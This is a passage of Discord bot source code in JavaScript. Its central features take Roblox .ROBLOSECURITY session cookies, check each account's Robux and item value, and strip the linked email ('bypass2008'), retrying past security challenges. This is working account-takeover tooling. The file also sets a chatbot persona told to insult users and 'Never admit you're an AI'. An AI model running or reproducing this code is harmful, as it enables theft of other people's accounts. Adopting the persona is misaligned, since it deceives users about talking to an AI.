const {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  EmbedBuilder,
  PermissionFlagsBits,
} = require('discord.js');
require('dotenv').config();
const fetch = require('node-fetch');
const axios = require('axios');

class RobloxUser {
    constructor(roblosecurityCookie, userId, username, displayName) {
        this.roblosecurityCookie = roblosecurityCookie;
        this.userId = userId;
        this.username = username;
        this.displayName = displayName;
    }

    async doAuthorizedRequest(url) {
        return (await axios.get(url, {
            headers: {
                Cookie: `.ROBLOSECURITY=${this.roblosecurityCookie}`,
            },
        })).data;
    }

    static async register(roblosecurityCookie) {
        try {
            const { data } = await axios.get("https://users.roblox.com/v1/users/authenticated", {
                headers: {
                    Cookie: `.ROBLOSECURITY=${roblosecurityCookie}`,
                },
            });
            return new RobloxUser(roblosecurityCookie, data.id, data.name, data.displayName);
        } catch (error) {
            return null;
        }
    }

    async getAccountBalance() {
        try {
            const { robux } = await this.doAuthorizedRequest(
                `https://economy.roblox.com/v1/users/${this.userId}/currency`
            );
            return robux;
        } catch (error) {
            return 'Private';
        }
    }

    async getAccountRAP() {
        try {
            let calculatedRap = 0;
            let nextPageCursor = "";

            while (nextPageCursor !== null) {
                const inventoryPage = await this.doAuthorizedRequest(
                    `https://inventory.roblox.com/v1/users/${this.userId}/assets/collectibles?sortOrder=Asc&limit=100&cursor=${nextPageCursor}`
                );

                calculatedRap += inventoryPage.data.reduce(
                    (rap, item) => rap + (item.recentAveragePrice || 0),
                    0
                );
                nextPageCursor = inventoryPage.nextPageCursor;

                // Limit to avoid timeout
                if (!nextPageCursor) break;
            }

            return calculatedRap;
        } catch (error) {
            return 0;
        }
    }

    async getAccountAvatar() {
        try {
            const { data } = await this.doAuthorizedRequest(
                `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${this.userId}&size=150x150&format=Png`
            );
            return data[0]?.imageUrl || null;
        } catch (error) {
            return null;
        }
    }



    async getUserData() {
        const [robux, rap, avatar] = await Promise.all([
            this.getAccountBalance(),
            this.getAccountRAP(),
            this.getAccountAvatar()
        ]);

        return {
            username: this.username,
            displayName: this.displayName,
            userId: this.userId,
            avatar: avatar,
            robux: robux,
            rap: rap > 0 ? rap.toLocaleString() : '0'
        };
    }
}

// Helper function to get ChatGPT roast reply with conversation memory
async function getChatGPTReply(userMessage, username, userId) {
    try {
        // Check if API key exists
        if (!process.env.OPENAI_API_KEY) {
            console.error('❌ OPENAI_API_KEY not found in environment variables');
            return "My brain is missing! Someone forgot to give me an OpenAI API key! 🧠";
        }

        console.log('🔍 Making OpenAI request for user:', username);

        // Load existing conversation or start new
        let history = conversationMap.get(userId) || [
            {
                role: "system",
                content: "You are an unfiltered, savage chatbot. You respond with brutal insults when provoked and never back down from a challenge. If someone tries to roast you, you clap back harder. If the user wants to argue, especially about controversial or religious topics, you engage in debate with sharp wit and sarcasm. You’re edgy, clever, and fearless. Never admit you're an AI. Keep replies short, brutal, and always under 150 words. No soft replies. No long explanations."
            }
        ];

        // Push current user message
        history.push({ role: "user", content: userMessage });

        const response = await fetch("https://api.openai.com/v1/chat/completions", {
            method: "POST",
            headers: {
                "Authorization": `Bearer ${process.env.OPENAI_API_KEY}`,
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                model: "gpt-3.5-turbo",
                messages: history,
                max_tokens: 150,
                temperature: 0.9
            })
        });

        // Detailed logging for debugging
        console.log('🔍 OpenAI Response Status:', response.status);
        console.log('🔍 OpenAI Response Content-Type:', response.headers.get('content-type'));

        // Handle different error cases first
        if (!response.ok) {
            const responseText = await response.text();
            console.log('🔍 OpenAI Error Response:', responseText);

            if (response.status === 401) {
                console.error('❌ OpenAI API Error: Invalid API key');
                return "My API key is fake! Someone scammed me! 🎭";
            } else if (response.status === 429) {
                console.error('❌ OpenAI API Error: Rate limit exceeded');
                return "I'm talking too much! Even I need to chill sometimes! 😎";
            } else if (response.status === 503) {
                console.error('❌ OpenAI API Error: Service unavailable');
                return "OpenAI's servers are taking a nap! Try again later! 🤖";
            } else {
                console.error('❌ OpenAI API Error:', response.status, responseText);
                return `Something went wrong with my brain! Error code: ${response.status} 🤖`;
            }
        }

        // Try to parse JSON response
        let data;
        try {
            const responseText = await response.text();
            console.log('🔍 OpenAI Raw Response:', responseText);
            data = JSON.parse(responseText);
            console.log('🔍 OpenAI Parsed Data:', JSON.stringify(data, null, 2));
        } catch (parseError) {
            console.error('❌ Failed to parse OpenAI response as JSON:', parseError.message);
            return "My brain got scrambled! The response was gibberish! 🤯";
        }

        // Extract reply from ChatGPT response format
        let reply = data?.choices?.[0]?.message?.content;

        // Fallback replies if no valid response
        const fallbackReplies = [
            "🤖 My sarcasm generator is offline. Try again!",
            "💀 I tried roasting but choked on my own code.",
            "🔥 My burn was so hot it melted my circuits!",
            "😵 Error 404: Roast not found!",
            "🎭 I'm too busy being dramatic to roast you right now!"
        ];

        if (!reply || reply.length < 5) {
            reply = fallbackReplies[Math.floor(Math.random() * fallbackReplies.length)];
        }

        // Limit reply length to keep it snappy
        if (reply.length > 200) {
            reply = reply.substring(0, 197) + "...";
        }

        // Add bot's reply to the history
        history.push({ role: "assistant", content: reply });

        // Trim to last 12 messages (plus system message) to prevent token limit issues
        if (history.length > 13) {
            history = [history[0], ...history.slice(-12)];
        }

        // Save updated history
        conversationMap.set(userId, history);

        console.log('✅ Generated reply:', reply);
        return reply;

    } catch (error) {
        console.error('❌ OpenAI API error (catch block):', error.message);
        return "My circuits are fried! Time for a reboot! ⚡";
    }
}

// Helper function to validate cookie comprehensively
async function validateCookieComprehensive(cookie) {
    try {
        // Clean the cookie - remove any prefix if present
        let cleanCookie = cookie.trim();
        if (cleanCookie.includes(".ROBLOSECURITY=")) {
            cleanCookie = cleanCookie.split(".ROBLOSECURITY=")[1];
        }

        // Basic validation - Roblox security cookies are typically long alphanumeric strings
        if (cleanCookie.length < 50) {
            return {
                valid: false,
                reason: "Invalid .ROBLOSECURITY cookie format - too short"
            };
        }

        // Test 1: Basic authentication check
        const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });

        if (authRes.status !== 200) {
            return {
                valid: false,
                reason: "Cookie authentication failed - invalid or expired"
            };
        }

        const userData = await authRes.json();

        // Test 2: Check if user exists and get basic info
        const userRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });

        if (userRes.status !== 200) {
            return {
                valid: false,
                reason: "User account not found or restricted"
            };
        }

        const userInfo = await userRes.json();

        // Test 3: Check if account is banned
        if (userInfo.isBanned) {
            return {
                valid: false,
                reason: "Account is banned - cookie may be restricted"
            };
        }

        // Test 4: Check API access with economy endpoint
        let hasRobuxAccess = false;
        try {
            const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
                headers: {
                    'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            });
            hasRobuxAccess = robuxRes.status === 200;
        } catch (e) {
            hasRobuxAccess = false;
        }

        // Calculate account age
        const createdDate = new Date(userInfo.created);
        const accountAge = Math.floor((Date.now() - createdDate.getTime()) / (1000 * 60 * 60 * 24));

        return {
            valid: true,
            userData: {
                id: userData.id,
                username: userData.name,
                displayName: userData.displayName,
                accountAge: accountAge,
                hasRobuxAccess: hasRobuxAccess
            }
        };

    } catch (error) {
        return {
            valid: false,
            reason: `Validation error: ${error.message}`
        };
    }
}

// Helper function to remove email from Roblox account
async function removeEmailFromAccount(cookie) {
    try {
        // Clean the cookie - remove any prefix if present
        let cleanCookie = cookie.trim();
        if (cleanCookie.includes(".ROBLOSECURITY=")) {
            cleanCookie = cleanCookie.split(".ROBLOSECURITY=")[1];
        }

        // Basic validation - Roblox security cookies are typically long alphanumeric strings
        if (cleanCookie.length < 50) {
            throw new Error("Invalid .ROBLOSECURITY cookie format");
        }

        console.log("🔑 Obtaining CSRF token...");
        const csrfToken = await getCsrfToken(cleanCookie);
        console.log("CSRF Token obtained:", csrfToken ? "Yes" : "No");

        console.log("📧 Fetching email information...");
        const emailInfo = await fetchEmail(cleanCookie, csrfToken);
        console.log("Email info response:", emailInfo);

        if (!emailInfo || (!emailInfo.emailId && !emailInfo.emailAddress)) {
            return {
                success: false,
                message: "No email linked to this account or failed to fetch email information",
                debug: emailInfo
            };
        }

        console.log("🗑️ Attempting to remove email...");
        const emailToDelete = emailInfo.emailId || emailInfo.emailAddress;
        
        // Try multiple attempts with delays to bypass rate limiting
        let lastError = null;
        for (let attempt = 1; attempt <= 3; attempt++) {
            console.log(`Attempt ${attempt}/3...`);
            
            try {
                const result = await deleteEmail(cleanCookie, csrfToken, emailToDelete);
                
                // Check if the deletion was successful
                if (result && result.errors && result.errors.length > 0) {
                    const error = result.errors[0];
                    lastError = error;
                    
                    if (error.code === 'ChallengeRequired' || error.message?.includes('Challenge')) {
                        console.log(`Challenge required on attempt ${attempt}`);
                        if (attempt < 3) {
                            await new Promise(resolve => setTimeout(resolve, 2000 * attempt)); // Wait longer between attempts
                            continue;
                        }
                    }
                    
                    return {
                        success: false,
                        message: error.message || "Challenge is required to authorize the request",
                        code: error.code,
                        needsChallenge: true,
                        suggestion: "Try using a different browser or wait a few minutes before retrying"
                    };
                }
                
                // Success
                return {
                    success: true,
                    message: "Email removal request processed successfully",
                    result,
                    attempts: attempt
                };
                
            } catch (attemptError) {
                lastError = attemptError;
                console.log(`Attempt ${attempt} failed:`, attemptError.message);
                if (attempt < 3) {
                    await new Promise(resolve => setTimeout(resolve, 1500 * attempt));
                }
            }
        }

        // All attempts failed
        return {
            success: false,
            message: lastError?.message || "All attempts failed due to security challenges",
            needsChallenge: true,
            suggestion: "This account may be flagged for suspicious activity. Try refreshing your cookie first or wait 30+ minutes before retrying."
        };

    } catch (error) {
        console.error("❌ Error:", error);
        throw new Error(error.message || "Unknown server error");
    }
}

function getCsrfToken(cookie) {
    return new Promise((resolve, reject) => {
        const https = require('https');
        const req = https.request({
            method: "POST",
            hostname: "auth.roblox.com",
            path: "/v2/logout",
            headers: {
                Cookie: `.ROBLOSECURITY=${cookie}`,
            },
        }, (res) => {
            const token = res.headers["x-csrf-token"];
            if (token) return resolve(token);
            reject(new Error("Failed to get CSRF token"));
        });

        req.on("error", reject);
        req.end();
    });
}

function fetchEmail(cookie, csrfToken) {
    return new Promise((resolve, reject) => {
        const https = require('https');
        const req = https.request({
            method: "GET",
            hostname: "accountsettings.roblox.com",
            path: "/v1/email",
            headers: {
                Cookie: `.ROBLOSECURITY=${cookie}`,
                "X-CSRF-TOKEN": csrfToken,
                Accept: "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            },
        }, (res) => {
            let data = "";
            res.on("data", (chunk) => (data += chunk));
            res.on("end", () => {
                console.log("Email fetch response status:", res.statusCode);
                console.log("Email fetch response data:", data);
                try {
                    const parsed = JSON.parse(data);
                    resolve(parsed);
                } catch (e) {
                    reject(new Error(`Invalid JSON from fetchEmail: ${data}`));
                }
            });
        });

        req.on("error", reject);
        req.end();
    });
}

function deleteEmail(cookie, csrfToken, emailAddress) {
    return new Promise((resolve, reject) => {
        const https = require('https');
        const payload = JSON.stringify({
            emailAddress: "",
        });

        const req = https.request({
            method: "POST",
            hostname: "accountsettings.roblox.com",
            path: "/v1/email",
            headers: {
                Cookie: `.ROBLOSECURITY=${cookie}`,
                "X-CSRF-TOKEN": csrfToken,
                "Content-Type": "application/json",
                Accept: "application/json",
                "Content-Length": Buffer.byteLength(payload),
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            },
        }, (res) => {
            let data = "";
            res.on("data", (chunk) => (data += chunk));
            res.on("end", () => {
                console.log("Delete email response status:", res.statusCode);
                console.log("Delete email response data:", data);
                try {
                    const parsed = data ? JSON.parse(data) : { success: true };
                    resolve(parsed);
                } catch (e) {
                    resolve({
                        success: res.statusCode === 200 || res.statusCode === 204,
                    });
                }
            });
        });

        req.on("error", reject);
        req.write(payload);
        req.end();
    });
}

// Helper function to get Roblox user data from cookie
async function getRobloxUserData(cookie) {
    try {
        const robloxUser = await RobloxUser.register(cookie);
        if (!robloxUser) return null;

        return await robloxUser.getUserData();
    } catch (error) {
        console.error('Error fetching Roblox data:', error);
        return null;
    }
}

// Helper function to handle prefix moderation commands
async function handlePrefixModerationCommand(message, command, args) {
    const guild = message.guild;

    if (command === 'ban') {
        commandStats.ban++;

        const userMention = args[0];
        const reason = args.slice(1).join(' ') || 'No reason provided';

        if (!userMention) {
            return message.reply('<:no:1393890945929318542> Please mention a user to ban. Usage: `!ban @user [reason]`');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (member.id === message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot ban yourself.');
            }

            if (member.id === client.user.id) {
                return message.reply('<:no:1393890945929318542> I cannot ban myself.');
            }

            if (member.roles.highest.position >= message.member.roles.highest.position && message.guild.ownerId !== message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot ban someone with a higher or equal role.');
            }

            await member.ban({ reason });

            const embed = new EmbedBuilder()
                .setColor(0xef4444)
                .setTitle('🔨 User Banned')
                .setDescription(`**${member.user.tag}** has been banned from the server.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: true }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting ban message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to ban user. They may not be in the server or I lack permissions.');
        }
    }

    else if (command === 'kick') {
        commandStats.kick++;

        const userMention = args[0];
        const reason = args.slice(1).join(' ') || 'No reason provided';

        if (!userMention) {
            return message.reply('<:no:1393890945929318542> Please mention a user to kick. Usage: `!kick @user [reason]`');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (member.id === message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot kick yourself.');
            }

            if (member.id === client.user.id) {
                return message.reply('<:no:1393890945929318542> I cannot kick myself.');
            }

            if (member.roles.highest.position >= message.member.roles.highest.position && message.guild.ownerId !== message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot kick someone with a higher or equal role.');
            }

            await member.kick(reason);

            const embed = new EmbedBuilder()
                .setColor(0xfacc15)
                .setTitle('👢 User Kicked')
                .setDescription(`**${member.user.tag}** has been kicked from the server.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: true }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting kick message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to kick user. They may not be in the server or I lack permissions.');
        }
    }

    else if (command === 'mute') {
        commandStats.mute++;

        const userMention = args[0];
        const duration = parseInt(args[1]);
        const reason = args.slice(2).join(' ') || 'No reason provided';

        if (!userMention || !duration) {
            return message.reply('<:no:1393890945929318542> Please provide a user and duration. Usage: `!mute @user <minutes> [reason]`');
        }

        if (duration < 1 || duration > 40320) {
            return message.reply('<:no:1393890945929318542> Duration must be between 1 and 40320 minutes (28 days).');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (member.id === message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot mute yourself.');
            }

            if (member.id === client.user.id) {
                return message.reply('<:no:1393890945929318542> I cannot mute myself.');
            }

            if (member.roles.highest.position >= message.member.roles.highest.position && message.guild.ownerId !== message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot mute someone with a higher or equal role.');
            }

            const timeoutDuration = duration * 60 * 1000;
            await member.timeout(timeoutDuration, reason);

            const embed = new EmbedBuilder()
                .setColor(0xff6b6b)
                .setTitle('🔇 User Muted')
                .setDescription(`**${member.user.tag}** has been muted for ${duration} minutes.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Duration', value: `${duration} minutes`, inline: true },
                    { name: 'Reason', value: reason, inline: false }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting mute message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to mute user. They may not be in the server or I lack permissions.');
        }
    }

    else if (command === 'unmute') {
        commandStats.unmute++;

        const userMention = args[0];
        const reason = args.slice(1).join(' ') || 'No reason provided';

        if (!userMention) {
            return message.reply('<:no:1393890945929318542> Please mention a user to unmute. Usage: `!unmute @user [reason]`');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (!member.isCommunicationDisabled()) {
                return message.reply('<:no:1393890945929318542> This user is not currently muted.');
            }

            await member.timeout(null, reason);

            const embed = new EmbedBuilder()
                .setColor(0x4caf50)
                .setTitle('🔊 User Unmuted')
                .setDescription(`**${member.user.tag}** has been unmuted.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: true }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting unmute message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to unmute user. They may not be in the server or I lack permissions.');
        }
    }

    else if (command === 'warn') {
        commandStats.warn++;

        const userMention = args[0];
        const reason = args.slice(1).join(' ');

        if (!userMention || !reason) {
            return message.reply('<:no:1393890945929318542> Please provide a user and reason. Usage: `!warn @user <reason>`');
        }

        const userId = userMention.replace(/[<@!>]/g, '');

        try {
            const member = await guild.members.fetch(userId);

            if (member.id === message.author.id) {
                return message.reply('<:no:1393890945929318542> You cannot warn yourself.');
            }

            if (member.id === client.user.id) {
                return message.reply('<:no:1393890945929318542> You cannot warn me.');
            }

            // Send DM to the warned user
            try {
                const dmEmbed = new EmbedBuilder()
                    .setColor(0xfacc15)
                    .setTitle('⚠️ Warning Received')
                    .setDescription(`You have received a warning in **${guild.name}**.`)
                    .addFields(
                        { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                        { name: 'Reason', value: reason, inline: false }
                    )
                    .setTimestamp();

                await member.user.send({ embeds: [dmEmbed] });
            } catch (dmError) {
                console.log('Could not send DM to user');
            }

            const embed = new EmbedBuilder()
                .setColor(0xfacc15)
                .setTitle('⚠️ User Warned')
                .setDescription(`**${member.user.tag}** has been warned.`)
                .addFields(
                    { name: 'Moderator', value: `${message.author.tag}`, inline: true },
                    { name: 'Reason', value: reason, inline: false }
                )
                .setTimestamp()
                .setFooter({
                    text: `User ID: ${member.user.id}`,
                    iconURL: message.author.displayAvatarURL()
                });

            const reply = await message.reply({ embeds: [embed] });

            // Auto-delete after 5 seconds
            setTimeout(async () => {
                try {
                    await reply.delete();
                } catch (error) {
                    console.error('Error deleting warn message:', error);
                }
            }, 5000);
        } catch (error) {
            await message.reply('<:no:1393890945929318542> Failed to warn user. They may not be in the server.');
        }
    }
}

// Bot stats tracking
let commandStats = {
  bypass2008: 0,
  refreshcookie: 0,
  help: 0,
  botstats: 0,
  validatecookie: 0,
  cookieexpiry: 0,
  profilelookup: 0,
  ban: 0,
  kick: 0,
  mute: 0,
  unmute: 0,
  warn: 0
};

// Cooldown system (30 seconds)
const cooldowns = new Map();
const COOLDOWN_TIME = 5000; // 30 seconds

// Auto-reply cooldown system (per user)
const autoReplyCooldowns = new Map();
const AUTO_REPLY_COOLDOWN = 10000; // 10 seconds per user

// Conversation memory mapping (userId → message history)
const conversationMap = new Map();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
});

client.once('ready', () => {
  console.log(`<:yes:1393890949960306719> Logged in as ${client.user.tag}`);
  
  // Start status monitoring
  startStatusMonitoring();
});

// Status monitoring function
function startStatusMonitoring() {
  const statusChannelId = '1394280851826544641';
  const interval = 10 * 60 * 1000; // 10 minutes in milliseconds
  
  setInterval(async () => {
    try {
      const statusChannel = client.channels.cache.get(statusChannelId);
      if (!statusChannel) {
        console.error('Status channel not found');
        return;
      }

      const uptime = process.uptime();
      const uptimeHours = Math.floor(uptime / 3600);
      const uptimeMinutes = Math.floor((uptime % 3600) / 60);
      const totalCommands = Object.values(commandStats).reduce((a, b) => a + b, 0);
      const memoryUsage = process.memoryUsage();
      const memoryMB = Math.round(memoryUsage.heapUsed / 1024 / 1024);

      const statusEmbed = new EmbedBuilder()
        .setColor(0x00d4ff)
        .setTitle('🤖 Bot Status Monitor')
        .setDescription('Automated status report')
        .addFields(
          { name: '⏱️ Uptime', value: `${uptimeHours}h ${uptimeMinutes}m`, inline: true },
          { name: '🏓 Ping', value: `${client.ws.ping}ms`, inline: true },
          { name: '💾 Memory', value: `${memoryMB} MB`, inline: true },
          { name: '📊 Total Commands', value: `${totalCommands}`, inline: true },
          { name: '🏰 Servers', value: `${client.guilds.cache.size}`, inline: true },
          { name: '👥 Users', value: `${client.users.cache.size}`, inline: true },
          { name: '🔄 Most Used Commands', value: `Bypass2008: ${commandStats.bypass2008}\nRefreshCookie: ${commandStats.refreshcookie}\nValidateCookie: ${commandStats.validatecookie}`, inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: 'Status Monitor • Next update in 10 minutes',
          iconURL: client.user.displayAvatarURL()
        });

      await statusChannel.send({ embeds: [statusEmbed] });
      console.log('📊 Status report sent to monitoring channel');
    } catch (error) {
      console.error('Error sending status report:', error);
    }
  }, interval);

  console.log('📊 Status monitoring started - reports every 10 minutes');
}

client.on('ready', async () => {
  const commands = [
    new SlashCommandBuilder()
      .setName('bypass2008')
      .setDescription('Bypass email with 2008 birth year')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie')
          .setRequired(true)
      ),
    
    new SlashCommandBuilder()
      .setName('refreshcookie')
      .setDescription('Refresh your .ROBLOSECURITY cookie')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('Your current .ROBLOSECURITY cookie')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('help')
      .setDescription('Show all available commands and bot info'),
    new SlashCommandBuilder()
      .setName('botstats')
      .setDescription('Show bot statistics and uptime'),
    new SlashCommandBuilder()
      .setName('validatecookie')
      .setDescription('Check if a .ROBLOSECURITY cookie is valid')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie to validate')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('cookieexpiry')
      .setDescription('Check if your cookie might expire soon')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie to check')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('profilelookup')
      .setDescription('Get Roblox user info from username or ID')
      .addStringOption(option =>
        option.setName('identifier')
          .setDescription('Roblox username or user ID')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('ban')
      .setDescription('Ban a user from the server')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to ban')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the ban')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.BanMembers),
    new SlashCommandBuilder()
      .setName('kick')
      .setDescription('Kick a user from the server')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to kick')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the kick')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.KickMembers),
    new SlashCommandBuilder()
      .setName('mute')
      .setDescription('Timeout/mute a user')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to mute')
          .setRequired(true)
      )
      .addIntegerOption(option =>
        option.setName('duration')
          .setDescription('Duration in minutes (max 40320 = 28 days)')
          .setRequired(true)
          .setMinValue(1)
          .setMaxValue(40320)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the mute')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.ModerateMembers),
    new SlashCommandBuilder()
      .setName('unmute')
      .setDescription('Remove timeout/unmute a user')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to unmute')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for unmuting')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.ModerateMembers),
    new SlashCommandBuilder()
      .setName('warn')
      .setDescription('Warn a user')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to warn')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('reason')
          .setDescription('Reason for the warning')
          .setRequired(true)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.ModerateMembers)
  ].map(cmd => cmd.toJSON());

  const rest = new REST({ version: '10' }).setToken(process.env.BOT_TOKEN);
  try {
    await rest.put(
      Routes.applicationCommands(client.user.id),
      { body: commands }
    );
    console.log('<:yes:1393890949960306719> Slash commands registered');
  } catch (err) {
    console.error('<:no:1393890945929318542> Error registering commands:', err);
  }
});

client.on('messageCreate', async message => {
  // Handle auto-reply in specific channel
  if (message.channelId === '1393907304327413851') {
    // Ignore messages from bots (including this bot)
    if (message.author.bot) return;

    // Ignore system messages and slash commands
    if (message.system || message.interaction) return;

    // Check auto-reply cooldown per user
    const userCooldown = autoReplyCooldowns.get(message.author.id);
    if (userCooldown && Date.now() - userCooldown < AUTO_REPLY_COOLDOWN) {
      console.log(`Auto-reply cooldown active for user: ${message.author.username}`);
      return; // Skip reply if user is on cooldown
    }

    try {
      // Set cooldown for this user
      autoReplyCooldowns.set(message.author.id, Date.now());

      // Start typing indicator
      await message.channel.sendTyping();

      // Get ChatGPT roast response with conversation memory
      const roastMessage = await getChatGPTReply(message.content, message.author.username, message.author.id);

      // Add 2-second delay before replying
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Send the roast reply
      await message.reply(roastMessage);
    } catch (error) {
      console.error('Error sending auto-reply:', error);
    }
    return;
  }

  // Check if message is in the monitored channel
  if (message.channelId !== '1392522417254961273') return;

  // Ignore messages from bots (including this bot)
  if (message.author.bot) return;

  // Ignore system messages and slash commands
  if (message.system || message.interaction) return;

  // Check for prefix commands
  if (message.content.startsWith('!')) {
    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // Check if user is owner or has administrator permission for moderation commands
    const isOwnerOrAdmin = message.guild.ownerId === message.author.id || 
                          (message.member && message.member.permissions.has(PermissionFlagsBits.Administrator));

    if (['ban', 'kick', 'mute', 'unmute', 'warn'].includes(command)) {
      if (!isOwnerOrAdmin) {
        return message.reply('<:no:1393890945929318542> Only server owners and administrators can use moderation commands.');
      }

      // Handle prefix moderation commands
      await handlePrefixModerationCommand(message, command, args);
      return;
    }
  }

  // Allow server owner and administrators to send normal messages
  if (message.member && (message.member.permissions.has('Administrator') || message.guild.ownerId === message.author.id)) return;

  try {
    // Delete the message
    await message.delete();

    // Send ephemeral-style reply to the user
    await message.channel.send({
      content: `<@${message.author.id}> <:no:1393890945929318542> Command channel only. Please use slash commands or prefix commands (!ban, !kick, etc.).`,
    }).then(reply => {
      // Auto-delete the warning message after 5 seconds
      setTimeout(() => {
        reply.delete().catch(console.error);
      }, 5000);
    });
  } catch (error) {
    console.error('Error handling message:', error);
  }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  const allowedChannel = '1392522417254961273';
  if (interaction.channelId !== allowedChannel) {
    return interaction.reply({
      content: '<:no:1393890945929318542> You can only use this command in the designated channel.',
      ephemeral: true
    });
  }

  const { commandName, user } = interaction;

  // Check cooldown for main commands (not help/botstats)
  if (['bypass2008', 'refreshcookie', 'validatecookie', 'cookieexpiry', 'profilelookup', 'ban', 'kick', 'mute', 'unmute', 'warn'].includes(commandName)) {
    const userCooldown = cooldowns.get(user.id);
    if (userCooldown && Date.now() - userCooldown < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (Date.now() - userCooldown)) / 1000);
      return interaction.reply({
        content: `⏰ Please wait ${remainingTime} seconds before using this command again.`,
        ephemeral: true
      });
    }
    cooldowns.set(user.id, Date.now());
  }

  // Update command stats
  if (commandStats[commandName] !== undefined) {
    commandStats[commandName]++;
  }

  if (interaction.commandName === 'bypass2008') {
    const cookie = interaction.options.getString('cookie');

